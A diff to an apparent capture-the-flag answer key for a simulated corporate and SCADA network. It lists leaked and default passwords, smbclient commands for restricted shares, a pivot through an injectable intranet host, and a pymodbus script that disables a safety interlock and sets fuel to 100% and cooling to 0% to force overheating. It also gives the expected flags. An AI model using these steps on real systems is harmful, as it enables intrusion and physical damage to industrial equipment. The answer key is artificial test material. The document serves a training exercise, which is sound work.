@@ -23,7 +23,7 @@ These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at 
 
 1. Log into the webmail (Roundcube) at `http://mail.boreas.local` as one of the employees. Try `d.kowalski` / `P@ssw0rd123` (found from the config leak on A3 or from A0's employee directory + password guessing).
 2. Look through Dr. Vasik's mailbox (you may need her credentials: `e.vasik` / `Reactor#Core9`).
-3. Find the email with subject "Re: Locomotion milestone?" that has a PDF attachment: `project_status_report_oct2025.pdf`.
+3. Find the email with subject "Re: Locomotion milestone? [with attachment]" (there is a second, plain reply with subject "Re: Locomotion milestone?" — the one you want carries the PDF `project_status_report_oct2025.pdf`).
 4. Open the PDF. At the bottom it has a Report ID containing the flag.
 
 **Expected flag:** `FLAG{3b7e9a2d1c8f4063}`
@@ -32,8 +32,11 @@ These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at 
 
 ## Flag 9 — HR Records / Terminated Engineer (Easy, 50pts)
 
-1. Connect to the file share: `smbclient //fileserv.boreas.local/HR -U <username>%<password>`
-   Use any employee credentials. HR share is accessible to HR group + Executives.
+1. The HR share is restricted to the `hr` and `executives` groups. You need an Executive credential. The A3 intranet HR wiki page leaks the "New employee default password: `Welcome1`" and notes that several employees never changed it — `m.webb` (COO, listed on the A0 leadership page) is one of them. Connect:
+   ```
+   smbclient //fileserv.boreas.local/HR -U "m.webb%Welcome1"
+   ```
+   (`d.kowalski` / `P@ssw0rd123` is NOT in executives and will get `NT_STATUS_ACCESS_DENIED` — the IT group is only allowed on the `IT` share.)
 2. Navigate to `personnel/`.
 3. Download `chen_james_termination.pdf`.
 4. The flag is on **page 2** of the PDF, in the "Case Reference Number" field.
@@ -79,7 +82,10 @@ These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at 
 
 ## Flag 13 — Procurement Orders / Hydraulic Actuators (Medium, 100pts)
 
-1. Connect to the Procurement share: `smbclient //fileserv.boreas.local/Procurement -U <username>%<password>`
+1. The Procurement share is restricted to the `procurement` and `executives` groups. Use the same Executive credential as flag 9 (`m.webb / Welcome1`):
+   ```
+   smbclient //fileserv.boreas.local/Procurement -U "m.webb%Welcome1"
+   ```
 2. Download `PO-2847_hydraulic_actuators.pdf`.
 3. Read the PO. In the **Special Instructions** field, it references: `specs/actuator_requirements_v4.pdf`.
 4. Navigate to the `specs/` subdirectory and download `actuator_requirements_v4.pdf`.
@@ -182,14 +188,31 @@ These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at 
 
 ---
 
+## SCADA pivot (applies to flags 18 + 19)
+
+The SCADA HMI sits on VLAN 40 (`172.20.40.0/24`) and is **not directly reachable from Kali**. Per the docker-compose topology, `a3-intranet` is the only Front Office container that bridges `corporate` + `scada` + `lab`, so it is the canonical pivot host.
+
+**For testing** — bypass the pivot by exec'ing straight onto A3 (or A5) and running the commands from there:
+```
+sudo docker exec -it a3-intranet /bin/bash
+# a3-intranet has python3 + postgresql-client; install pymodbus if you need flag 19:
+pip install pymodbus
+```
+For a real exploitation path a participant would need to gain code execution on A3 first (the Flask `/search` endpoint is SQLi-vulnerable, and the wiki renderer uses `render_template_string` — SSTI is in scope) and then run a socat/python TCP forwarder, but those steps are outside the flag 18/19 objectives themselves.
+
+---
+
 ## Flag 18 — SCADA Interface Discovered (Hard, 200pts)
 
-1. The SCADA HMI is on VLAN 40, not directly reachable. Discover it from:
+1. The SCADA HMI is on VLAN 40, not directly reachable. Discover its hostname from one of:
    - The IT share network diagram (VLAN 40: `scada-gw.boreas.local`)
    - Kowalski's email about isolating the SCADA on VLAN 40
-   - The intranet IT Knowledge Base page
-2. Pivot through a compromised Front Office host to reach VLAN 40.
-3. Access the HMI monitoring dashboard at `http://scada-gw.boreas.local:8080` — no auth required for monitoring.
+   - The A3 intranet IT Knowledge Base page
+2. Pivot through A3 (see the SCADA pivot section above). From A3:
+   ```
+   python3 -c "import urllib.request; print(urllib.request.urlopen('http://scada-gw.boreas.local:8080/').read().decode())" | head -60
+   ```
+3. The HMI monitoring dashboard at `http://scada-gw.boreas.local:8080` requires no auth for monitoring.
 4. The flag is in the **page footer** as "S/N: FLAG{...}".
 
 **Expected flag:** `FLAG{1d4e7b0a3c9f8265}`
@@ -201,8 +224,19 @@ These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at 
 1. Access the SCADA HMI architecture page at `/architecture`. It reveals:
    - A Modbus PLC on port 502 controls the hardware interlock
    - The interlock must be bypassed via raw Modbus before the HMI controls work
-2. Authenticate to the HMI control panel with `svc-scada` credentials (from Kerberoasting A2, or from the A4 IT share).
-3. Use a Modbus client to bypass the interlock:
+2. Pivot through A3 (see the SCADA pivot section above) to reach `scada-gw.boreas.local` on both `:8080` (HMI) and `:502` (Modbus).
+3. Authenticate to the HMI control panel with `svc-scada` credentials. Discovery path: the IT share on A4 contains `service_account_vault.pdf` (Kowalski's "do not email" cred sheet) — the `svc-scada` row has `Sc@da#2025!`. You need IT-share read access, which the `svc-fileshare` service account from flag 15 (Kowalski's "creds backup" email on A1) provides:
+   ```
+   smbclient //fileserv.boreas.local/IT -U "svc-fileshare%F1l3Sh@r3Svc!" -c "get service_account_vault.pdf"
+   pdf2txt.py service_account_vault.pdf | grep -iE 'svc-scada|Sc@da'
+   ```
+   (The `svc-scada` Kerberos hash on A2 is not rockyou-crackable — the IT share is the intended path.)
+4. The maintenance key `7734` is documented in `generator_maintenance_manual.pdf` on the same IT share — it's the NV-3200 vendor's bypass procedure for the thermal-loop interlock. Download and read:
+   ```
+   smbclient //fileserv.boreas.local/IT -U "svc-fileshare%F1l3Sh@r3Svc!" -c "get generator_maintenance_manual.pdf"
+   pdf2txt.py generator_maintenance_manual.pdf | grep -E '7734|register 100|MAINT_KEY'
+   ```
+5. Use a Modbus client to bypass the interlock (from the pivot host — e.g., inside a3-intranet after `pip install pymodbus`):
    ```python
    from pymodbus.client import ModbusTcpClient
    c = ModbusTcpClient("scada-gw.boreas.local", port=502)
@@ -210,14 +244,13 @@ These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at 
    c.write_register(address=200, value=7734)  # maintenance key
    c.write_register(address=100, value=0)      # disable interlock
    ```
-   The maintenance key `7734` is documented in a maintenance manual on the A4 IT share.
-4. With interlock bypassed, set fuel injection to 100% and cooling to 0%:
+6. With interlock bypassed, set fuel injection to 100% and cooling to 0%:
    ```python
    c.write_register(address=10, value=100)  # fuel 100%
    c.write_register(address=11, value=0)    # cooling 0%
    ```
-5. Wait ~12 seconds. The HMI shows temperature climbing to CRITICAL.
-6. The flag appears on the "CRITICAL FAILURE" screen on the web dashboard.
-7. **This is the collective gate** — it opens the Bunker for all participants.
+7. Wait ~12 seconds. The HMI shows temperature climbing to CRITICAL.
+8. The flag appears on the "CRITICAL FAILURE" screen on the web dashboard.
+9. **This is the collective gate** — it opens the Bunker for all participants.
 
 **Expected flag:** `FLAG{a7f2c8d0e5b34169}`
